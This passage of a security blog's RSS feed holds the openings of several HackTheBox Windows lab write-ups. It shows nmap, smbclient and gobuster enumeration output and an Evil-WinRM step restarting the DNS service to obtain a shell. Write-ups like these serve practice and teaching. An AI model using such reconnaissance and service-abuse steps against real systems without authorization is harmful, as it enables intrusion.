+SERVICE_EXIT_CODE : 0 (0x0)
+CHECKPOINT : 0x0
+WAIT_HINT : 0x0
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan\Documents&amp;gt; sc.exe start dns
+SERVICE_NAME: dns
+TYPE : 10 WIN32_OWN_PROCESS
+STATE : 2 START_PENDING
+(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+WIN32_EXIT_CODE : 0 (0x0)
+SERVICE_EXIT_CODE : 0 (0x0)
+CHECKPOINT : 0x0
+WAIT_HINT : 0x7d0
+PID : 1668
+FLAGS :
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>If everything is okay, we should receive shell&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/images/3.png">&lt;/p></description></item><item><title>[HTB] Machine: Search</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/</guid><description>&lt;h1 id="search">Search&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.11.129 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 21:42 BST
+Warning: 10.10.11.129 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.11.129 (10.10.11.129)
+Host is up (0.10s latency).
+Not shown: 65514 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp open domain
+80/tcp open http
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+443/tcp open https
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+8172/tcp open unknown
+9389/tcp open adws
+49667/tcp open unknown
+49675/tcp open unknown
+49676/tcp open unknown
+49702/tcp open unknown
+49712/tcp open unknown
+49733/tcp open unknown
+Nmap done: 1 IP address (1 host up) scanned in 1222.26 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -sC -sV 10.10.11.129 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 22:12 BST
+Nmap scan report for 10.10.11.129 (10.10.11.129)
+Host is up (0.18s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+80/tcp open http Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Search &amp;amp;mdash; Just Testing IIS
+| http-methods:
+|_ Potentially risky methods: TRACE
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-23 21:12:07Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+443/tcp open ssl/http Microsoft IIS httpd 10.0
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| tls-alpn:
+|_ http/1.1
+| http-methods:
+|_ Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Search &amp;amp;mdash; Just Testing IIS
+445/tcp open microsoft-ds?
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+8172/tcp open ssl/http Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
+| Not valid before: 2020-04-07T09:05:25
+|_Not valid after: 2030-04-05T09:05:25
+|_http-title: Site doesn&amp;#39;t have a title.
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| tls-alpn:
+|_ http/1.1
+9389/tcp open mc-nmf .NET Message Framing
+Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: -40s, deviation: 0s, median: -41s
+| smb2-time:
+| date: 2023-09-23T21:13:05
+|_ start_date: N/A
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.21 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //search.htb
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to search.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web Server
+&lt;ul>
+&lt;li>Ports &lt;code>80&lt;/code>, &lt;code>443&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Forest</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/</link><pubDate>Sat, 24 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/</guid><description>&lt;h1 id="forest">Forest&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -sC -sV -Pn 10.10.10.161 -T4
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST
+Nmap scan report for 10.10.10.161 (10.10.10.161)
+Host is up (0.15s latency).
+Not shown: 989 closed tcp ports (conn-refused)
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: 2h26m18s, deviation: 4h02m30s, median: 6m17s
+| smb-security-mode:
+| account_used: &amp;lt;blank&amp;gt;
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: required
+| smb2-security-mode:
+| 311:
+|_ Message signing enabled and required
+| smb2-time:
+| date: 2023-06-26T15:39:27
+|_ start_date: 2023-06-26T14:24:16
+| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name:
+FOREST
+| NetBIOS computer name: FOREST\x00
+| Domain name: htb.local
+| Forest name: htb.local
+| FQDN: FOREST.htb.local
+|_ System time: 2023-06-26T08:39:24-07:00
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.94 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Dns
+&lt;ul>
+&lt;li>No results with zone transfer&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Heist</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/heist/</link><pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/heist/</guid><description>&lt;h1 id="heist">Heist&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -sC -sV -Pn 10.10.10.149
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 10:40 BST
+Nmap scan report for 10.10.10.149 (10.10.10.149)
+Host is up (0.10s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT STATE SERVICE VERSION
+80/tcp open http Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+| http-cookie-flags:
+| /:
+| PHPSESSID:
+|_ httponly flag not set
+| http-methods:
+|_ Potentially risky methods: TRACE
+135/tcp open msrpc Microsoft Windows RPC
+445/tcp open microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: -30s
+| smb2-time:
+| date: 2023-06-24T09:40:31
+|_ start_date: N/A
+| smb2-security-mode:
+| 311:
+|_ Message signing enabled but not required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 63.50 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>gobuster&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ gobuster dir -u http://10.10.10.149 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx,php
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url: http://10.10.10.149
+[+] Method: GET
+[+] Threads: 50
+[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes: 404
+[+] User Agent: gobuster/3.5
+[+] Extensions: asp,aspx,php
+[+] Timeout: 10s
+===============================================================
+2023/06/24 11:12:31 Starting gobuster in directory enumeration mode
+===============================================================
+/images (Status: 301) [Size: 150] [--&amp;gt; http://10.10.10.149/images/]
+/index.php (Status: 302) [Size: 0] [--&amp;gt; login.php]
+/login.php (Status: 200) [Size: 2058]
+/Images (Status: 301) [Size: 150] [--&amp;gt; http://10.10.10.149/Images/]
+/issues.php (Status: 302) [Size: 16] [--&amp;gt; login.php]
+/css (Status: 301) [Size: 147] [--&amp;gt; http://10.10.10.149/css/]
+/Index.php (Status: 302) [Size: 0] [--&amp;gt; login.php]
+/Login.php (Status: 200) [Size: 2058]
+/js (Status: 301) [Size: 146] [--&amp;gt; http://10.10.10.149/js/]
+/Issues.php (Status: 302) [Size: 16] [--&amp;gt; login.php]
+/attachments (Status: 301) [Size: 155] [--&amp;gt; http://10.10.10.149/attachments/]
+/IMAGES (Status: 301) [Size: 150] [--&amp;gt; http://10.10.10.149/IMAGES/]
+/INDEX.php (Status: 302) [Size: 0] [--&amp;gt; login.php]
+/CSS (Status: 301) [Size: 147] [--&amp;gt; http://10.10.10.149/CSS/]
+/JS (Status: 301) [Size: 146] [--&amp;gt; http://10.10.10.149/JS/]
+/Attachments (Status: 301) [Size: 155] [--&amp;gt; http://10.10.10.149/Attachments/]
+/LogIn.php (Status: 200) [Size: 2058]
+/LOGIN.php (Status: 200) [Size: 2058]
+Progress: 882180 / 882244 (99.99%)
+===============================================================
+2023/06/24 11:59:05 Finished
+===============================================================
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web server&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/heist/images/1.png">&lt;/p></description></item></channel></rss>
